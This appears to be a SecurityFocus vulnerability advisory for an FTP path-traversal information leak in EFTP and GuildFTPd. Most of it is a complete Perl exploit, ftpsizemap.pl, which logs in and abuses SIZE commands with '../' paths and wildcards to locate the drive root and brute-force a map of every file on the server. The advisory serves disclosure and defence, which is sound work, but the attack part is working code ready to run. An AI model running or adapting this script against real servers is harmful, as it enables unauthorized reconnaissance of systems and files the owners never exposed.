source: http://www.securityfocus.com/bid/3333/info

A user can confirm the existence and location of files and directory structure information, by submitting a 'size' or 'mdtm' command of a file. If the command is carried out by the vulnerable service, the attacker can confirm the location of the file.

Submitting a 'size' or 'mdtm' command for a file outside of the FTP root could disclose directory structure information of unpublished filesystems on the host. If the requested command is fulfilled by the vulnerable service, the attacker can confirm the relative path to the file.

#!/usr/bin/perl
# ftpsizemap.pl - maps the drive contents using the SIZE/MDTM commands with wildcards
#
# Syntax: perl ftpsizemap.pl <host> <port> <user> <pass> >files.log
#
# vulnerable ftp servers : EFTP v2.0.7.337, GuildFTPd v0.992
# by [ByteRage] <byterage@yahoo.com> http://www.byterage.cjb.net

use IO::Socket;

$cmd = "SIZE";

@chars = ('A','B','C','D','E','F','G','H','I','J','K','L','M',
          'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
          '0','1','2','3','4','5','6','7','8','9','.');

if (!($host = $ARGV[0])) { $host = "127.0.0.1"; } print "Logging on @ $host:"; 
if (!($port = $ARGV[1])) { $port = "21"; } print "$port as user "; 
if (!($loginid = $ARGV[2])) { $loginid = "anonymous"; } print "${loginid}:"; 
if (!($loginpwd = $ARGV[3])) { $loginpwd = "anonymous"; } print "${loginpwd}\n"; 

$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$host, PeerPort=>$port) || die "Couldn't create socket !"; $sock->autoflush();

print "\nLogging in...\n";
$reply = <$sock>;
print $reply; print "USER ${loginid}\015\012";
print $sock "USER ${loginid}\015\012";
$reply = <$sock>; print $reply;
print "PASS ${loginpwd}\015\012";
print $sock "PASS ${loginpwd}\015\012";
do {
  $reply = <$sock>; print "$reply";
} while $reply !~ /230\s/;

print "\nDetermining root directory...\n";
$level = 0;
$rootdir = "";
do {
  print $sock "$cmd ${rootdir}*\015\012";
  $reply = <$sock>; print $reply;
  print $sock "$cmd ${rootdir}../*\015\012";
  $reply2 = <$sock>; print $reply2;
  if  (!($reply eq $reply2)) { $rootdir .= "../"; $level++; }
} while (!($reply eq $reply2));
print "The harddrive's root directory is apparently ${level} directories up\nCorrect manually if you want to map another directory.\n";

print "\nMapping directory...\n";
$lastchar = $chars[($#chars)];
${file} = "";
do {
  print $sock "$cmd ${rootdir}${file}?\015\012";
  $reply = <$sock>;
  if ($reply =~ /213\s/) {
    for ($ind = 0; $ind<(@chars); $ind++) {
      print $sock "$cmd ${rootdir}${file}$chars[$ind]\015\012"; 
      $reply = <$sock>;
      if ($reply =~ /213\s/) {
        print "${rootdir}${file}$chars[$ind]\n";
      }
    }
    $file .= $chars[0];
  } else {
    do {
      print $sock "$cmd ${rootdir}${file}*\015\012";
      $reply = <$sock>;
      if ($reply =~ /213\s/) {
        print $sock "$cmd ${rootdir}${file}\015\012";
        $reply = <$sock>;
        if ($reply !~ /213\s/) {
          $file .= $chars[0];
        } else {
          do {
            if (length($file) > 0) {
              $lastc = chop($file);
            } else {
              break;
            }
          } while ($lastc eq $lastchar);
          if (length($lastc) == 1) {
            for ($ind = 0; $ind<$#chars; $ind++) {
              if ($lastc eq $chars[$ind]) { $file .= $chars[$ind+1]; break; }
            }
          }
        }
      } else {
        do {
          if (length($file) > 0) {
            $lastc = chop($file);
          } else {
            break;
          }
        } while ($lastc eq $lastchar);
        if (length($lastc) == 1) {
          for ($ind = 0; $ind<$#chars; $ind++) {
            if ($lastc eq $chars[$ind]) { $file .= $chars[$ind+1]; break; }
          }
        }
      }
    } while ($reply =~ /213\s/);
  }
} while !($file eq "");

close($sock);

exit;
